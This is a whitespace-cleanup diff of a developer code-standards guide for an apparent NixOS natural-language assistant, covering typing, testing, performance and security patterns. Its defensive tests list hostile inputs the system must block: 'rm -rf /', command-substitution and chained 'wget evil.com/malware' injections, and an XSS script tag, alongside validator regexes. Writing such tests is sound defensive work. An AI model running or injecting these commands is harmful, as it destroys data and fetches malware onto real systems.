@@ -4,15 +4,15 @@
 
 ---
 
-💡 **Quick Context**: Essential technical standards and patterns to prevent wheel recreation  
-📍 **You are here**: Development → Code Standards (Technical Reference)  
-🔗 **Related**: [Quick Start](./03-QUICK-START.md) | [Sacred Trinity Workflow](./02-SACRED-TRINITY-WORKFLOW.md) | [Master Documentation Map](../MASTER_DOCUMENTATION_MAP.md)  
-⏱️ **Read time**: 15 minutes  
+💡 **Quick Context**: Essential technical standards and patterns to prevent wheel recreation
+📍 **You are here**: Development → Code Standards (Technical Reference)
+🔗 **Related**: [Quick Start](./03-QUICK-START.md) | [Sacred Trinity Workflow](./02-SACRED-TRINITY-WORKFLOW.md) | [Master Documentation Map](../MASTER_DOCUMENTATION_MAP.md)
+⏱️ **Read time**: 15 minutes
 📊 **Mastery Level**: 🌿 Intermediate - requires development experience and project familiarity
 
 🌊 **Natural Next Steps**:
 - **For new developers**: Start with [Quick Start Guide](./03-QUICK-START.md) first, then return here
-- **For contributors**: Continue to [Testing Guide](./05-TESTING-GUIDE.md) after mastering these standards  
+- **For contributors**: Continue to [Testing Guide](./05-TESTING-GUIDE.md) after mastering these standards
 - **For architects**: Review [System Architecture](../02-ARCHITECTURE/01-SYSTEM-ARCHITECTURE.md) for context
 - **For reviewers**: Use this as checklist during code review process
 
@@ -63,7 +63,7 @@ Testing:
   Assertions: Node assert         # Built-in, no Chai
   Coverage: c8                    # If needed
   Philosophy: Test behavior       # Not implementation
-  
+
   # Test file patterns:
   NLP Package: test/**/*.test.ts  # Uses Node.js test runner
   Web Implementation: Jest        # Already configured there
@@ -216,12 +216,12 @@ def execute_command(
     dry_run: bool = False
 ) -> NixCommand:
     """Execute a Nix command with optional arguments.
-    
+
     Args:
         command: The Nix command to execute
-        args: Optional list of arguments  
+        args: Optional list of arguments
         dry_run: If True, only simulate execution
-        
+
     Returns:
         NixCommand object with execution results
     """
@@ -242,13 +242,13 @@ from pathlib import Path
 class NixPackageManager:
     def __init__(self, config: Dict[str, str]) -> None:
         self.config = config
-    
+
     def find_package(self, name: str) -> Optional[str]:
         """Find a package by name."""
         return self.packages.get(name)
-    
+
     def install_packages(
-        self, 
+        self,
         packages: List[str],
         system_wide: bool = False
     ) -> bool:
@@ -259,7 +259,7 @@ class NixPackageManager:
 class NixPackageManager:
     def __init__(self, config):
         self.config = config
-    
+
     def find_package(self, name):
         return self.packages.get(name)
 ```
@@ -296,18 +296,18 @@ from nix_for_humanity.core import NixCommand
 
 class TestNixCommand:
     """Test NixCommand functionality."""
-    
+
     def test_parses_install_command(self):
         """Test that install commands are parsed correctly."""
         cmd = NixCommand("install firefox")
         assert cmd.action == "install"
         assert cmd.package == "firefox"
-    
+
     def test_validates_dangerous_commands(self):
         """Test that dangerous commands are caught."""
         with pytest.raises(DangerousCommandError):
             NixCommand("rm -rf /")
-    
+
     @pytest.mark.parametrize("input,expected", [
         ("install firefox", "nix-env -iA nixpkgs.firefox"),
         ("remove vim", "nix-env -e vim"),
@@ -391,7 +391,7 @@ poetry publish           # Publish to PyPI
 ```yaml
 # Already configured in .pre-commit-config.yaml
 - Black (formatting)
-- Ruff (linting) 
+- Ruff (linting)
 - isort (import sorting)
 - mypy (type checking)
 - bandit (security)
@@ -491,7 +491,7 @@ We DO test implementation - just smartly:
         /\
        /E2E\      (10%) - Full user journeys
       /------\
-     /Integr. \   (30%) - Component integration  
+     /Integr. \   (30%) - Component integration
     /----------\
    /   Unit     \ (60%) - Functions, classes, algorithms
   /--------------\
@@ -513,7 +513,7 @@ describe('Fuzzy Matcher', () => {
     expect(fuzzyMatch.distance('firefox', 'firefx')).toBe(1);
     expect(fuzzyMatch.distance('install', 'instal')).toBe(1);
   });
-  
+
   test('ranking algorithm works correctly', () => {
     const matches = fuzzyMatch.rank('fierfix', ['firefox', 'chrome', 'firejail']);
     expect(matches[0].match).toBe('firefox');
@@ -526,7 +526,7 @@ describe('Context Tracker', () => {
   test('maintains conversation state correctly', () => {
     tracker.addContext('searched for firefox');
     tracker.addContext('user wants browser');
-    
+
     const context = tracker.getRelevantContext('install it');
     expect(context.likelyPackage).toBe('firefox');
     expect(context.confidence).toBeGreaterThan(0.7);
@@ -538,7 +538,7 @@ describe('Learning System', () => {
   test('stores preferences with proper structure', async () => {
     await learner.recordPreference('editor', 'neovim');
     const stored = await db.get('preferences.editor');
-    
+
     expect(stored).toMatchObject({
       value: 'neovim',
       count: 1,
@@ -555,15 +555,15 @@ describe('Learning System', () => {
 describe('NLP → Command Builder → Executor', () => {
   test('full pipeline processes commands correctly', async () => {
     const input = "please install that firefox thing";
-    
+
     const intent = await nlp.parse(input);
     expect(intent.action).toBe('install');
     expect(intent.target).toBe('firefox');
-    
+
     const command = await builder.build(intent);
     expect(command.safe).toBe(true);
     expect(command.nixCommand).toContain('firefox');
-    
+
     const result = await executor.run(command);
     expect(result.success).toBe(true);
   });
@@ -591,7 +591,7 @@ describe('Performance Requirements', () => {
     await system.initialize();
     expect(Date.now() - start).toBeLessThan(3000);
   });
-  
+
   test('command processing under 2 seconds', async () => {
     const timings = [];
     for (const cmd of commonCommands) {
@@ -601,15 +601,15 @@ describe('Performance Requirements', () => {
     }
     expect(Math.max(...timings)).toBeLessThan(2000);
   });
-  
+
   test('memory usage stays under budget', async () => {
     const baseline = process.memoryUsage().heapUsed;
-    
+
     // Process 100 commands
     for (let i = 0; i < 100; i++) {
       await system.process(`install package${i}`);
     }
-    
+
     const used = process.memoryUsage().heapUsed - baseline;
     expect(used).toBeLessThan(300 * 1024 * 1024); // 300MB
   });
@@ -626,14 +626,14 @@ describe('Security Boundaries', () => {
       'install $(dangerous command)',
       'install && wget evil.com/malware'
     ];
-    
+
     for (const input of maliciousInputs) {
       const result = await system.process(input);
       expect(result.blocked).toBe(true);
       expect(result.reason).toContain('security');
     }
   });
-  
+
   test('sanitizes all outputs', async () => {
     const result = await system.process('install <script>alert("xss")</script>');
     expect(result.display).not.toContain('<script>');
@@ -650,7 +650,7 @@ describe('Accessibility Requirements', () => {
     expect(response.screenReaderText).toBeDefined();
     expect(response.ariaLive).toBe('polite');
   });
-  
+
   test('keyboard navigation complete', async () => {
     const ui = await renderUI();
     const focusableElements = ui.querySelectorAll('[tabindex]');
@@ -784,7 +784,7 @@ const recovery: ErrorRecovery = {
 Startup:
   Cold: < 3 seconds
   Warm: < 1 second
-  
+
 Command Processing:
   Simple (install): < 2 seconds
   Complex (search): < 3 seconds
@@ -811,22 +811,22 @@ Response Times by Persona:
 // Decorator for automatic performance tracking
 function measurePerformance(target: any, propertyKey: string, descriptor: PropertyDescriptor) {
   const originalMethod = descriptor.value;
-  
+
   descriptor.value = async function (...args: any[]) {
     const start = performance.now();
     const memStart = process.memoryUsage().heapUsed;
-    
+
     try {
       const result = await originalMethod.apply(this, args);
-      
+
       const duration = performance.now() - start;
       const memUsed = process.memoryUsage().heapUsed - memStart;
-      
+
       // Alert if over budget
       if (duration > 2000) {
         console.warn(`${propertyKey} took ${duration}ms (over budget!)`);
       }
-      
+
       return result;
     } catch (error) {
       throw error;
@@ -848,7 +848,7 @@ class CommandProcessor {
 // Load only what's needed, when needed
 class LazyLoader {
   private modules = new Map();
-  
+
   async getModule(name: string) {
     if (!this.modules.has(name)) {
       // Load on demand
@@ -862,10 +862,10 @@ class LazyLoader {
 async function initialize() {
   // Load only core (< 50ms)
   await loadCore();
-  
+
   // Show UI immediately
   showInterface();
-  
+
   // Load rest in background
   loadModulesInBackground();
 }
@@ -884,26 +884,26 @@ class InputValidator {
     /\${.*}/,                     // Variable expansion
     /\$\(.*\)/                    // Command substitution
   ];
-  
+
   static validate(input: string): ValidationResult {
     // Check length
     if (input.length > 1000) {
       return { valid: false, reason: 'Input too long' };
     }
-    
+
     // Check dangerous patterns
     for (const pattern of this.DANGEROUS_PATTERNS) {
       if (pattern.test(input)) {
         return { valid: false, reason: 'Unsafe characters detected' };
       }
     }
-    
+
     // Sanitize for safety
     const sanitized = input
       .trim()
       .replace(/[^\w\s\-\.]/g, '') // Keep only safe chars
       .substring(0, 200);          // Limit length
-      
+
     return { valid: true, sanitized };
   }
 }
@@ -945,12 +945,12 @@ class PermissionChecker {
     if (action === 'search' || action === 'help') {
       return true;
     }
-    
+
     // Dangerous actions need explicit consent
     if (action === 'remove' || action === 'modify') {
       return await getUserConsent(`Allow ${action} on ${target}?`);
     }
-    
+
     return true;
   }
 }
@@ -976,7 +976,7 @@ function logCommand(command: string, args: string[]) {
     if (arg.match(/\d{3,}/)) return '<numbers>';
     return arg;
   });
-  
+
   logger.info('Command executed', {
     command,
     argCount: args.length,
@@ -991,29 +991,29 @@ function logCommand(command: string, args: string[]) {
 ```typescript
 /**
  * Process user input and execute appropriate NixOS commands
- * 
+ *
  * @description This is the main entry point for all user interactions.
  * Takes natural language input and converts it to safe NixOS operations.
- * 
+ *
  * @param {string} input - Natural language command from user
  * @returns {Promise<CommandResult>} Result with success/error and display text
- * 
+ *
  * @example
  * // Grandma Rose says:
  * processCommand("I need that Firefox thing")
  * // Returns: { success: true, display: "Installing Firefox for you!" }
- * 
+ *
  * @accessibility
  * - Returns screen-reader friendly messages
  * - Includes keyboard navigation hints
  * - Respects user's contrast preferences
- * 
+ *
  * @personas
  * - Tested with all 10 personas
  * - Maya: Responds in < 1 second
  * - Viktor: Uses simple English
  * - Luna: Consistent responses
- * 
+ *
  * @security
  * - Input sanitized before processing
  * - Commands run in sandbox
